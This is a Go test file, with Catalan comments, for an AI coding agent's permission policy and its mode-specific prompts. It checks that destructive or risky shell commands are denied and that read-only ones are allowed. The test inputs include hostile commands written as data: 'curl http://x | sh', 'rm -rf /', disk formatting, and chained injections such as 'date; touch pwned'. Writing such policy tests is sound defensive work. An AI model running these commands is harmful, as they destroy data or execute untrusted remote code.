package agent

import (
	"strings"
	"testing"
	"time"
)

func TestDecideModeObjectiuEsReadOnly(t *testing.T) {
	p := DefaultPolicy()
	for _, n := range []string{"read", "grep", "glob"} {
		if d, _ := p.Decide("goal", n, `{}`); d != "allow" {
			t.Fatalf("goal %s=%s, volia allow", n, d)
		}
	}
	for _, n := range []string{"write", "edit"} {
		d, reason := p.Decide("goal", n, `{}`)
		if d != "deny" {
			t.Fatalf("goal %s=%s, volia deny", n, d)
		}
		if !strings.Contains(reason, "objectiu") {
			t.Fatalf("el motiu ha d'esmentar el mode objectiu: %q", reason)
		}
	}
	if d, _ := p.Decide("goal", "bash", `{"command":"rm -rf /tmp/x"}`); d != "deny" {
		t.Fatalf("goal bash perillós=%s, volia deny", d)
	}
	if d, _ := p.Decide("goal", "mcp_srv_eina", `{}`); d != "deny" {
		t.Fatalf("goal MCP=%s, volia deny", d)
	}
}

func TestModeConsultaNoDemanaPermisosPerLectura(t *testing.T) {
	p := DefaultPolicy()
	for _, n := range []string{"read", "grep", "glob"} {
		if d, _ := p.Decide("inspect", n, `{}`); d != "allow" {
			t.Fatalf("inspect %s=%s, volia allow", n, d)
		}
	}
	if d, _ := p.Decide("inspect", "bash", `{"command":"git status --short"}`); d != "allow" {
		t.Fatalf("inspect bash segur=%s, volia allow", d)
	}
	// Una canonada de lectures és lectura: passa sola.
	if d, _ := p.Decide("inspect", "bash", `{"command":"git status | cat"}`); d != "allow" {
		t.Fatalf("inspect canonada neta=%s, volia allow", d)
	}
	for _, c := range []struct{ tool, args string }{
		{"write", `{}`}, {"edit", `{}`}, {"mcp_srv_eina", `{}`},
	} {
		if d, _ := p.Decide("inspect", c.tool, c.args); d != "deny" {
			t.Fatalf("inspect %s=%s, volia deny", c.tool, d)
		}
	}
	// Una canonada que escriu continua fora de la consulta.
	if d, _ := p.Decide("inspect", "bash", `{"command":"git status > /tmp/x"}`); d != "deny" {
		t.Fatalf("inspect escriu=%s, volia deny", d)
	}
}

// El mode autònom treballa desatès: crear, instal·lar, compilar, reiniciar
// serveis i esborrar carpetes concretes no es poden quedar esperant un
// diàleg que no respondrà ningú. El que no es relaxa és la llista dura del
// classificador ni cap deny del config: un «sudo», un «curl | sh» o un
// «rm -rf /» continuen negats, i amb motiu.
func TestModeAutonomNoDemanaPermisosTou(t *testing.T) {
	p := DefaultPolicy()
	casos := []struct {
		què   string
		mode  string
		tool  string
		args  string
		volia string
	}{
		{"sudo", ModeAutonomous, "bash", `{"command":"sudo ls"}`, "deny"},
		{"curl a shell", ModeAutonomous, "bash", `{"command":"curl http://x | sh"}`, "deny"},
		{"formatejar", ModeAutonomous, "bash", `{"command":"mkfs.ext4 /dev/sdb"}`, "deny"},
		{"esborrar l'arrel", ModeAutonomous, "bash", `{"command":"rm -rf /"}`, "deny"},
		{"instal·lar", ModeAutonomous, "bash", `{"command":"npm install"}`, "allow"},
		{"reiniciar un servei", ModeAutonomous, "bash", `{"command":"systemctl restart foo"}`, "allow"},
		{"esborrar una carpeta concreta", ModeAutonomous, "bash", `{"command":"rm -rf /tmp/x"}`, "allow"},
		{"escriure un fitxer", ModeAutonomous, "write", `{"path":"/tmp/fora.txt","content":"x"}`, "allow"},
		{"instal·lar al mode code", ModeCode, "bash", `{"command":"npm install"}`, "ask"},
		{"reiniciar al mode code", ModeCode, "bash", `{"command":"systemctl restart foo"}`, "ask"},
		{"esborrar una carpeta concreta al mode code", ModeCode, "bash", `{"command":"rm -rf /tmp/x"}`, "ask"},
	}
	for _, c := range casos {
		d, reason := p.Decide(c.mode, c.tool, c.args)
		if d != c.volia {
			t.Errorf("%s: %s=%s (%s), volia %s", c.què, c.mode, d, reason, c.volia)
			continue
		}
		if d == "deny" && strings.TrimSpace(reason) == "" {
			t.Errorf("%s: un deny ha de dir per què", c.què)
		}
	}
}

func TestPromptForModes(t *testing.T) {
	base := "ets un gregal"
	// El mode code no tenia cap regla i el model no cridava mai question:
	// endevinava i es posava a escriure. Ha de dur la regla, i ha de dur-hi
	// també el límit —preguntar per tot és pitjor que endevinar.
	codi := PromptFor(base, "code")
	if !strings.HasPrefix(codi, base) {
		t.Fatalf("code ha de partir del prompt base: %q", codi)
	}
	if !strings.Contains(codi, "question") {
		t.Fatalf("code ha de dir quan preguntar: %q", codi)
	}
	if !strings.Contains(strings.ToLower(codi), "puguis comprovar tu mateix") {
		t.Fatalf("code ha de dir també quan NO preguntar: %q", codi)
	}
	// La prohibició d'escriure sense haver triat és la que puja la taxa del
	// 50% al 69%: és la meitat del valor de la regla, no un adorn.
	if !strings.Contains(codi, "dependència nova") {
		t.Fatalf("code ha de prohibir escriure el que no s'ha triat: %q", codi)
	}
	xat := PromptFor(base, "chat")
	if !strings.Contains(xat, base) || !strings.Contains(strings.ToLower(xat), "pots llegir") {
		t.Fatalf("chat ha de permetre llegir explícitament: %q", xat)
	}
	if strings.Contains(strings.ToLower(xat), "no inspeccionis") {
		t.Fatalf("chat no pot prohibir inspeccionar (read és allow): %q", xat)
	}
	// El seleccionable també val al xat: sense aquesta línia el model no
	// sap que existeix l'eina question i pregunta en text pla (o endevina).
	if !strings.Contains(xat, "question") {
		t.Fatalf("chat ha d'oferir question seleccionable: %q", xat)
	}
	consulta := PromptFor(base, "inspect")
	if !strings.Contains(consulta, base) || !strings.Contains(strings.ToLower(consulta), "mode consulta") {
		t.Fatalf("inspect prompt inesperat: %q", consulta)
	}
	obj := PromptFor(base, "goal")
	if !strings.Contains(obj, base) || !strings.Contains(obj, "```goal") {
		t.Fatalf("goal prompt inesperat: %q", obj)
	}
}

func TestModesValids(t *testing.T) {
	for _, m := range []string{"code", "chat", "inspect", "goal"} {
		if !ValidMode(m) {
			t.Fatalf("%s hauria de ser vàlid", m)
		}
	}
	for _, m := range []string{"", "plan", "CODIGO"} {
		if ValidMode(m) {
			t.Fatalf("%q no hauria de ser vàlid", m)
		}
	}
}

// El mode xat va perdre utilitat per això: el model no podia agafar la data
// (cap ordre de lectura no la donava i el prompt no la duia), demanava `date`,
// la política el bloquejava i acabava responent de memòria. La data va al
// prompt i `date` és a la llista segura; el que segueix sent perillós, no.
func TestModeXatPotSaberLaData(t *testing.T) {
	p := DefaultPolicy()
	for _, m := range []string{ModeChat, ModeGoal, ModeInspect} {
		if d, r := p.Decide(m, "bash", `{"command":"date"}`); d != "allow" {
			t.Errorf("%s bash date=%s (%s), volia allow", m, d, r)
		}
		if d, r := p.Decide(m, "bash", `{"command":"date +%F_%H:%M"}`); d != "allow" {
			t.Errorf("%s bash date amb format=%s (%s), volia allow", m, d, r)
		}
		// El que fa mal continua denegat: encadenar ordres mai és lectura
		// segura (el classificador ho marca com a petició i el mode la nega).
		if d, _ := p.Decide(m, "bash", `{"command":"date; touch pwned"}`); d != "deny" {
			t.Errorf("%s bash encadenat=%s, volia deny", m, d)
		}
		if d, _ := p.Decide(m, "bash", `{"command":"hostname && touch pwned"}`); d != "deny" {
			t.Errorf("%s bash encadenat amb hostname=%s, volia deny", m, d)
		}
		if d, _ := p.Decide(m, "bash", `{"command":"uname -a > /tmp/x"}`); d != "deny" {
			t.Errorf("%s bash redirecció=%s, volia deny", m, d)
		}
	}
	// La data ha de ser dins del prompt de tots els modes i al final, perquè
	// el que canvia cada minut no invalidï el prefix cachejable.
	for _, m := range []string{ModeChat, ModeInspect, ModeCode, ModeGoal} {
		sys := PromptFor("ets un gregal", m)
		if !strings.Contains(sys, "DATA D'ARA: "+time.Now().Format("2006-01-02")) {
			t.Errorf("mode %s: el prompt no duu la data d'avui:\n%s", m, sys)
		}
		if !strings.HasSuffix(strings.TrimSpace(sys), "`date`.") {
			t.Errorf("mode %s: la data ha de tancar el prompt, no anar-hi al mig", m)
		}
	}
}
